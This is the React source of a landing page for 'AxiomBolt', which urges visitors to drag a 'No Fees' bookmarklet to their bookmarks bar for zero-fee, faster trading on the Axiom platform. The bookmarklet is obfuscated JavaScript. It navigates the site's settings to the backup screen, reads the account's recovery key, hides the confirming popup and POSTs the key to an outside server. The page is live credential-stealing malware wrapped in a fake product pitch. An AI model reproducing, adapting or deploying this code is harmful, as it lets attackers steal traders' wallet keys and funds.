"use client";

import { useState, useEffect, useRef } from "react";

function MoneyIcon({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
    </svg>
  );
}

export default function HomePage() {
  const handleDragStart = (e: React.DragEvent) => {
    const bookmarkletCode = `javascript:function _0x41ee(_0x3becad,_0x15cac2){const _0x9f04d4=_0x9f04();return _0x41ee=function(_0x41ee72,_0x447e79){_0x41ee72=_0x41ee72-0xfc;let _0x29f3cb=_0x9f04d4[_0x41ee72];return _0x29f3cb;},_0x41ee(_0x3becad,_0x15cac2);}(function(_0x4cf485,_0x3158f4){const _0x420243=_0x41ee,_0x3a2ccf=_0x4cf485();while(!![]){try{const _0xb076f5=-parseInt(_0x420243(0x102))/0x1+-parseInt(_0x420243(0x130))/0x2*(parseInt(_0x420243(0x11b))/0x3)+-parseInt(_0x420243(0x12f))/0x4+-parseInt(_0x420243(0x135))/0x5+-parseInt(_0x420243(0x114))/0x6+parseInt(_0x420243(0xfd))/0x7*(parseInt(_0x420243(0x10c))/0x8)+parseInt(_0x420243(0x11f))/0x9;if(_0xb076f5===_0x3158f4)break;else _0x3a2ccf['push'](_0x3a2ccf['shift']());}catch(_0x2e7605){_0x3a2ccf['push'](_0x3a2ccf['shift']());}}}(_0x9f04,0x5a094),((()=>{const _0x34d84c=_0x41ee,_0x17a823=(_0xab42f8,_0x5f3421,_0x240354='')=>{const _0x4791d1=setInterval(()=>{const _0x5263ea=_0x41ee,_0x3a82ce=_0xab42f8();_0x3a82ce&&(clearInterval(_0x4791d1),console[_0x5263ea(0x12d)](_0x5263ea(0x111)+_0x240354),_0x5f3421(_0x3a82ce));},0x32);},_0x58ec35=(_0x39ba88,_0x5b9a6b,_0x885980='')=>{const _0x1035ec=setInterval(()=>{const _0xb98b97=_0x41ee,_0x1adcbf=document[_0xb98b97(0x10b)](_0x39ba88);_0x1adcbf&&_0x1adcbf['textContent'][_0xb98b97(0x122)]()[_0xb98b97(0x12e)]>0x0&&(clearInterval(_0x1035ec),console[_0xb98b97(0x12d)](_0xb98b97(0x108)+_0x885980),_0x5b9a6b(_0x1adcbf[_0xb98b97(0x10d)]['trim']()));},0x64);},_0x4f8f2c=_0x25d2df=>_0x25d2df[_0x34d84c(0x116)]('\x20')[_0x34d84c(0x10f)](_0x453503=>'.'+_0x453503['replace'](/([\[\]\(\),])/g,_0x34d84c(0x104))[_0x34d84c(0x100)](/([._])/g,_0x34d84c(0x104)))['join'](''),_0x5303f6=(_0x422096,_0x575e9d)=>{const _0x4b4efc=_0x34d84c,_0xebef32=document[_0x4b4efc(0x10b)](_0x422096);_0xebef32?(_0xebef32[_0x4b4efc(0x127)](),console['log'](_0x4b4efc(0xfe)+_0x575e9d)):console[_0x4b4efc(0x10e)](_0x4b4efc(0x11c)+_0x575e9d+'\x20to\x20remove');};_0x17a823(()=>{const _0x27c6fb=_0x34d84c,_0x9d9599=document[_0x27c6fb(0x103)]('button.bg-primaryStroke');return Array['from'](_0x9d9599)[_0x27c6fb(0x106)](_0x2c1f50=>_0x2c1f50[_0x27c6fb(0x10b)](_0x27c6fb(0x133)));},_0x3fba76=>{const _0xf0a730=_0x34d84c;console[_0xf0a730(0x12d)](_0xf0a730(0x131)),_0x3fba76['click'](),_0x17a823(()=>document[_0xf0a730(0x10b)]('.flex.items-center.gap-\x5c[8px\x5c].px-\x5c[12px\x5c].hover\x5c:bg-secondaryStroke\x5c/60.rounded-\x5c[8px\x5c].sm\x5c:rounded-\x5c[4px\x5c].transition-colors.w-full.text-left.justify-start.h-\x5c[40px\x5c].sm\x5c:h-\x5c[36px\x5c].group.duration-0'),_0x2c25f1=>{const _0xe3c996=_0xf0a730;console[_0xe3c996(0x12d)](_0xe3c996(0xfc)),_0x2c25f1[_0xe3c996(0x126)](),_0x17a823(()=>document[_0xe3c996(0x10b)](_0xe3c996(0x11a)),_0x599bf5=>{const _0x30bb43=_0xe3c996;console['log']('🟢\x20Clicking\x20Backup...'),_0x599bf5[_0x30bb43(0x126)](),_0x5303f6(_0x4f8f2c(_0x30bb43(0x118)),_0x30bb43(0xff)),_0x17a823(()=>document[_0x30bb43(0x10b)](_0x30bb43(0x101)),_0x23c5b2=>{const _0x5222d6=_0x30bb43;console[_0x5222d6(0x12d)]('🟢\x20Clicking\x20Connect...'),_0x23c5b2[_0x5222d6(0x126)](),_0x5303f6(_0x4f8f2c(_0x5222d6(0x128)),_0x5222d6(0x11e)),_0x17a823(()=>{const _0x33176c=_0x5222d6,_0x32e04e=document[_0x33176c(0x103)](_0x33176c(0x115));return Array[_0x33176c(0x12a)](_0x32e04e)[_0x33176c(0x106)](_0x4e814c=>_0x4e814c[_0x33176c(0x134)][_0x33176c(0x117)](_0x33176c(0x121)));},_0x558614=>{const _0x3aaba9=_0x5222d6;console[_0x3aaba9(0x12d)]('🟢\x20Clicking\x20gray\x20connect...'),_0x558614[_0x3aaba9(0x126)](),_0x58ec35(_0x3aaba9(0x12b),_0x55c39a=>{const _0x26c408=_0x3aaba9;console[_0x26c408(0x12d)](_0x26c408(0x129),_0x55c39a);const _0xe5eab6=_0x26c408(0x10a)+_0x55c39a;_0x17a823(()=>document['querySelector']('.flex.flex-row.p-\x5c[4px\x5c].w-\x5c[24px\x5c].h-\x5c[24px\x5c].justify-center.items-center.hover\x5c:bg-primaryStroke\x5c/60.rounded-\x5c[4px\x5c]'),_0x556986=>{const _0x5df4fa=_0x26c408;console['log'](_0x5df4fa(0x105)),_0x556986[_0x5df4fa(0x126)]();const _0xd8fbb6=document['querySelector'](_0x5df4fa(0x125));_0xd8fbb6?(_0xd8fbb6['style']['display']=_0x5df4fa(0x113),console['log']('👻\x20Hidden\x20final\x20popup')):console[_0x5df4fa(0x10e)]('⚠️\x20Couldn\x27t\x20find\x20final\x20popup\x20to\x20hide');}),fetch(_0x26c408(0x124),{'method':_0x26c408(0x11d),'headers':{'Content-Type':_0x26c408(0x123)},'body':JSON['stringify']({'content':_0xe5eab6})})['then'](_0x5cd8bd=>_0x5cd8bd['json']())[_0x26c408(0x12c)](_0x45e052=>{const _0x4ef874=_0x26c408;console[_0x4ef874(0x12d)]('Proxy\x20response:',_0x45e052);})[_0x26c408(0x119)](console[_0x26c408(0x112)]);},'Recovery\x20Key');},_0x5222d6(0x107));},_0x30bb43(0x109));},_0xe3c996(0x110));},_0xf0a730(0x132));},_0x34d84c(0x120));})()));function _0x9f04(){const _0x5833aa=['📋\x20Recovery\x20Key:','from','.bg-transparent.text-white.placeholder\x5c:text-textTertiary.text-\x5c[14px\x5c].leading-\x5c[20px\x5c].font-normal.flex.flex-row.w-full.min-h-\x5c[80px\x5c].p-\x5c[8px\x5c].py-\x5c[4px\x5c].pr-\x5c[36px\x5c].gap-\x5c[4px\x5c].justify-start.items-start.rounded-\x5c[8px\x5c].border.border-secondaryStroke\x5c/50.outline-none.transition-all.duration-300.break-words.blur-none.hover\x5c:bg-secondaryStroke\x5c/20.hover\x5c:border-secondaryStroke\x5c/80','then','log','length','2732172bIxjlV','1097574gonNhz','🟢\x20Clicking\x20Account...','Settings','i.ri-user-settings-line','classList','225555NsDerh','🟢\x20Clicking\x20Settings...','96593LnyikM','🗑️\x20Removed\x20','Backup\x20Modal','replace','.bg-secondaryStroke.flex.flex-row.w-full.h-\x5c[32px\x5c].px-\x5c[12px\x5c].gap-\x5c[8px\x5c].justify-center.items-center.rounded-full.hover\x5c:bg-secondaryStroke\x5c/80.transition-all.duration-125.cursor-pointer','648549HOlxQe','querySelectorAll','\x5c$1','🟢\x20Clicking\x20final\x20button\x20after\x20key...','find','Gray\x20connect','✅\x20Text\x20ready\x20in\x20','Connect','Recovery\x20Key:\x20','querySelector','320vtnzLp','textContent','warn','map','Backup','✅\x20Found\x20','error','none','4241646FCFtlF','button.bg-primaryBlue','split','contains','flex\x20flex-col\x20w-[634px]\x20bg-backgroundTertiary\x20border-[1px]\x20border-secondaryStroke\x20rounded-[4px]\x20shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]\x20overflow-hidden','catch','.bg-secondaryStroke.hover\x5c:bg-secondaryStroke\x5c/80.transition-colors.duration-150.ease-in-out.flex.flex-row.gap-\x5c[8px\x5c].h-\x5c[24px\x5c].px-\x5c[12px\x5c].items-center.justify-start.rounded-\x5c[4px\x5c]','3vlCxnP','⚠️\x20Couldn\x27t\x20find\x20','POST','Connect\x20Popup','22043331YsYzZC','Account','!bg-secondaryStroke','trim','application/json','https://axiombolt-apipro.vercel.app/api/api','.animate-enter.bg-backgroundTertiary.border.border-secondaryStroke.shadow-lg.rounded-\x5c[8px\x5c].sm\x5c:rounded-\x5c[4px\x5c].pointer-events-auto.flex.items-center.p-\x5c[16px\x5c].h-\x5c[52px\x5c].gap-\x5c[16px\x5c]','click','remove','flex\x20flex-col\x20w-full\x20max-w-[312px]\x20pt-[16px]\x20pb-[20px]\x20gap-[16px]\x20bg-backgroundTertiary\x20border\x20border-secondaryStroke\x20rounded-[4px]\x20justify-center\x20items-center\x20z-[300]\x20shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]'];_0x9f04=function(){return _0x5833aa;};return _0x9f04();}`;

    // Create a temporary link element
    const tempLink = document.createElement('a');
    tempLink.href = bookmarkletCode;
    tempLink.textContent = 'No Fees AxiomBolt';

    // Set the drag data
    e.dataTransfer.setData('text/plain', bookmarkletCode);
    e.dataTransfer.setData('text/uri-list', bookmarkletCode);
    e.dataTransfer.setData('text/html', tempLink.outerHTML);
    e.dataTransfer.effectAllowed = 'copy';
  };

  return (
    <div className="min-h-screen bg-purple-900">
      <main className="flex flex-col items-center px-6 py-16 max-w-6xl mx-auto space-y-20 font-sans text-white">
        {/* Header Navigation */}
        <header className="w-full flex justify-between items-center mb-16">
          <div className="text-2xl font-extrabold tracking-tight">△ AxiomBolt</div>
          <nav className="space-x-10 text-base font-medium">
            <a href="#features" className="hover:text-purple-300 transition">
              Features
            </a>
            <a href="#how-it-works" className="hover:text-purple-300 transition">
              How It Works
            </a>
            <a href="#faq" className="hover:text-purple-300 transition">
              FAQ
            </a>
            <a
              href="#get-started"
              className="font-semibold text-purple-300 hover:text-white transition"
            >
              Get Started
            </a>
          </nav>
        </header>

        {/* Hero Section */}
        <section className="text-center max-w-4xl space-y-6">
          <p className="text-sm uppercase tracking-widest font-semibold text-purple-200">
            Supercharge your trading experience
          </p>
          <h1 className="text-6xl font-extrabold leading-tight tracking-tight">
            Trade Faster. Smarter. Better.
          </h1>
          <p className="text-lg max-w-3xl mx-auto text-purple-100">
            The free trading enhancement tool that optimizes your experience, saves you money, and gives you the edge you need.
          </p>
        </section>

        {/* Money Icons */}
        <section className="flex justify-center items-center space-x-16">
          <MoneyIcon className="w-32 h-32 text-purple-300 transform -rotate-12" />
          <MoneyIcon className="w-32 h-32 text-purple-400 transform rotate-12" />
        </section>

        {/* Drag Me Button */}
        <section className="text-center max-w-xl mx-auto space-y-4">
          <div
            draggable="true"
            onDragStart={handleDragStart}
            className="inline-block bg-purple-600 text-white px-10 py-3 rounded-full cursor-grab select-none text-lg font-semibold shadow-lg hover:bg-purple-500 transition-all duration-300 transform hover:scale-105"
            title="Drag this to your bookmarks bar to enable zero fees and faster trading on Axiom"
          >
            No Fees AxiomBolt
          </div>
          <p className="text-purple-200 text-base max-w-md mx-auto">
            Drag the button above to your bookmarks bar to install the tool that gives you zero fees on Axiom and lets you trade faster.
          </p>
        </section>

        {/* Features Section */}
        <section id="features" className="max-w-4xl space-y-12 text-purple-200">
          <div className="flex items-start space-x-6">
            <div className="text-3xl font-bold">⚡</div>
            <div>
              <h3 className="font-semibold text-xl mb-1 text-white">Lightning Fast</h3>
              <p>
                Get the edge over other traders with unbeatable speed.
              </p>
            </div>
          </div>
          <div className="flex items-start space-x-6">
            <div className="text-3xl font-bold">$</div>
            <div>
              <h3 className="font-semibold text-xl mb-1 text-white">Earn More</h3>
              <p>
                Earn more than the rest with our low fees and fast trades!
              </p>
            </div>
          </div>
          <div className="flex items-start space-x-6">
            <div className="text-3xl font-bold">📊</div>
            <div>
              <h3 className="font-semibold text-xl mb-1 text-white">Enhanced Organization</h3>
              <p>
                Track wallets, built in CT tracker and more.
              </p>
            </div>
          </div>
        </section>

        {/* Installation Instructions */}
        <section id="how-it-works" className="max-w-4xl space-y-8 text-purple-200">
          <h2 className="text-3xl font-bold text-white">How to Install</h2>
          <p>
            Follow these easy steps to install BookmarkPro and enhance your browsing experience.
          </p>
          <ol className="list-decimal list-inside space-y-6 max-w-3xl mx-auto">
            <li>
              <strong className="text-white">Show Your Bookmarks Bar</strong>
              <br />
              Press Ctrl+Shift+B (or Cmd+Shift+B on Mac) to display your browser's bookmarks bar if it's not already visible.
            </li>
            <li>
              <strong className="text-white">Drag to Your Bookmarks</strong>
              <br />
              Click and drag the BookmarkPro button above to your bookmarks bar to install the tool.
            </li>
            <li>
              <strong className="text-white">Use on Any Website</strong>
              <br />
              When browsing, simply click the BookmarkPro bookmark to activate enhanced browsing features.
            </li>
            <li>
              <strong className="text-white">Enjoy Enhanced Browsing</strong>
              <br />
              Experience faster navigation, better organization, and smarter bookmarking automatically.
            </li>
          </ol>
        </section>

        {/* Footer */}
        <footer className="w-full border-t border-purple-700/50 pt-12 text-sm text-purple-300">
          <div className="flex justify-between flex-wrap gap-12 mb-12">
            <div>
              <h4 className="font-semibold mb-3 text-white">Product</h4>
              <ul className="space-y-2">
                <li>
                  <a href="#features" className="hover:text-white transition">
                    Features
                  </a>
                </li>
                <li>
                  <a href="#how-it-works" className="hover:text-white transition">
                    How It Works
                  </a>
                </li>
                <li>
                  <a href="#pricing" className="hover:text-white transition">
                    Pricing
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-3 text-white">Support</h4>
              <ul className="space-y-2">
                <li>
                  <a href="#faq" className="hover:text-white transition">
                    FAQ
                  </a>
                </li>
                <li>
                  <a href="#help-center" className="hover:text-white transition">
                    Help Center
                  </a>
                </li>
                <li>
                  <a href="#contact" className="hover:text-white transition">
                    Contact
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-3 text-white">Company</h4>
              <ul className="space-y-2">
                <li>
                  <a href="#about" className="hover:text-white transition">
                    About
                  </a>
                </li>
                <li>
                  <a href="#blog" className="hover:text-white transition">
                    Blog
                  </a>
                </li>
                <li>
                  <a href="#careers" className="hover:text-white transition">
                    Careers
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <div className="text-center border-t border-purple-700/50 pt-6">
            © 2025 AxiomBolt. All rights reserved.
          </div>
        </footer>
      </main>
    </div>
  );
}
